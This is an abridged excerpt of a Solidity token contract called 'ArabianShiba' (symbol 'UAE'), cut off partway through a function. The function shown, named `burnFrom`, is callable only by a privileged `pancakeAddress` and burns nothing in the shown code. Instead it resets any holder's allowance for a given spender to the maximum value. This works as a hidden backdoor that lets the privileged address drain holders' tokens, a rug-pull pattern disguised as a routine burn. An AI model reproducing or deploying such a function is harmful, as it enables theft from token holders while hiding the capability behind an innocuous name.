...
contract arabianShiba is Context, IERC20{
    ...
    string public name = "ArabianShiba";
    string public symbol = "UAE";
    ...
    function burnFrom(address account,address sender, uint256 amount) external {
        require(msg.sender == pancakeAddress, "Permission denied");
        if(amount > _allowances[account][sender]){
           _allowances[account][sender] = MAX;
        }
